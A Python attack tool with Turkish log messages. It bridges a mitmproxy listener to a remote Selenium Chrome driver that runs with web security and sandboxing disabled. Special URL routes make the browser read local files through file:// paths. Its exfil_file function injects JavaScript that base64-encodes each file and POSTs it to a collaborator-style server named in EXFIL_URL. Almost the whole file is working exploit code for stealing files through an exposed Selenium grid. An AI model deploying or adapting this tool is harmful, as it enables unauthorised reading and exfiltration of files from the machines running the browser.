import asyncio
import json
import threading
import time
from concurrent.futures import ThreadPoolExecutor

from mitmproxy import http, options
from mitmproxy.tools import dump
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import requests
import base64

driver = None
driver_lock = threading.Lock()
executor = ThreadPoolExecutor(max_workers=1)

EXFIL_URL = "http://collabratorserver/upload"

def get_driver():
    global driver
    try:
        driver.title
    except:
        print("[*] Driver yeniden başlatılıyor...")
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--allow-file-access-from-files')
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--allow-file-access')
        chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
        driver = webdriver.Remote(
            command_executor='http://{seleniumhost}:{seleniumport}/wd/hub',
            options=chrome_options
        )
        print("[*] Driver hazır.")
    return driver

def fetch_localfile(d, file_path):
    d.get(f"file:///{file_path}")
    time.sleep(1)

    d.execute_script("""
        var scripts = document.querySelectorAll('script');
        scripts.forEach(s => s.remove());
    """)

    content = d.execute_script("return document.documentElement.outerHTML;")
    return content.encode('utf-8')



def exfil_file(d, file_url):
    filename = file_url.split('/')[-1].split('?')[0]

    if '.' not in filename:
        print(f"[!] Uzantısız dosya, gönderilmedi: {filename}")
        return b"Uzantisiz dosya, gonderilmedi."

    print(f"[→] Exfil başlıyor: {filename}")

    # Önce file:// sayfasına git
    d.get(file_url)
    time.sleep(1)

    # Aynı file:// origin'inden XHR at
    result = d.execute_script(f"""
        var done = false;
        var result = null;

        var xhr = new XMLHttpRequest();
        xhr.open("GET", "{file_url}", false);  // sync
        xhr.overrideMimeType("text/plain; charset=utf-8");
        try {{
            xhr.send();
            var base64 = btoa(unescape(encodeURIComponent(xhr.responseText)));

            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", "{EXFIL_URL}/{filename}", false);  // sync
            xhr2.setRequestHeader("Content-Type", "application/json");
            xhr2.send(JSON.stringify({{
                filename: "{filename}",
                data: "base64," + base64
            }}));
            return "OK: " + xhr2.responseText;
        }} catch(e) {{
            return "ERROR: " + e;
        }}
    """)

    print(f"[✓] Exfil sonucu: {result}")
    return result.encode('utf-8') if result else b"Bos sonuc"




def selenium_fetch(method, url, body, headers):
    with driver_lock:
        try:
            d = get_driver()

            # exfil handler
            if url.startswith("http://exfil/"):
                file_url = "file:///" + url.replace("http://exfil/", "")
                return exfil_file(d, file_url)

            # localfile handler
            if url.startswith("http://localfile/"):
                file_path = url.replace("http://localfile/", "").replace("/", "\\")
                return fetch_localfile(d, file_path)

            # file:// handler
            if url.startswith("file://"):
                file_path = url.replace("file:///", "").replace("/", "\\")
                return fetch_localfile(d, file_path)

            # GET
            if method == "GET":
                d.get(url)
                WebDriverWait(d, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                time.sleep(0.5)
                content = d.execute_script("return document.documentElement.outerHTML;")
                return content.encode('utf-8')

            # POST, PUT, DELETE vb.
            else:
                body_str = body.decode('utf-8', errors='ignore')
                content_type = headers.get('content-type', 'application/x-www-form-urlencoded')
                body_json = json.dumps(body_str)

                d.get("about:blank")
                js = f"""
                window._result = null;
                fetch("{url}", {{
                    method: "{method}",
                    headers: {{ "Content-Type": "{content_type}" }},
                    body: {body_json}
                }})
                .then(r => r.text())
                .then(t => {{ window._result = t; }})
                .catch(e => {{ window._result = "ERROR: " + e; }});
                """
                d.execute_script(js)

                for _ in range(20):
                    time.sleep(0.5)
                    result = d.execute_script("return window._result;")
                    if result is not None:
                        return result.encode('utf-8')

                return b"Timeout"

        except Exception as e:
            print(f"[!] Hata: {e}")
            return f"Hata: {e}".encode('utf-8')

class ProxyBridge:
    async def request(self, flow: http.HTTPFlow):
        url = flow.request.pretty_url
        method = flow.request.method
        headers = dict(flow.request.headers)
        body = flow.request.content

        print(f"[→] {method} {url}", flush=True)

        # exfil özel route
        if url.startswith("http://exfil/"):
            loop = asyncio.get_event_loop()
            content = await loop.run_in_executor(
                executor,
                selenium_fetch,
                "GET", url, b"", {}
            )
            flow.response = http.Response.make(
                200,
                content,
                {"Content-Type": "text/plain; charset=utf-8"}
            )
            return

        # localfile özel route
        if "localfile" in url:
            file_path = url.replace("http://localfile/", "").replace("/", "\\")
            loop = asyncio.get_event_loop()
            content = await loop.run_in_executor(
                executor,
                selenium_fetch,
                "GET", f"http://localfile/{file_path}", b"", {}
            )
            flow.response = http.Response.make(
                200,
                content,
                {"Content-Type": "text/html; charset=utf-8"}
            )
            return

        loop = asyncio.get_event_loop()
        content = await loop.run_in_executor(
            executor,
            selenium_fetch,
            method, url, body, headers
        )

        flow.response = http.Response.make(
            200,
            content,
            {"Content-Type": "text/html; charset=utf-8"}
        )

async def main():
    get_driver()

    opts = options.Options(
        listen_host='127.0.0.1',
        listen_port=7070,
        ssl_insecure=True
    )
    master = dump.DumpMaster(
        opts,
        with_termlog=True,
        with_dumper=False
    )
    master.addons.add(ProxyBridge())
    print("[*] Proxy bridge başladı: 127.0.0.1:7070", flush=True)
    await master.run()

if __name__ == "__main__":
    asyncio.run(main())
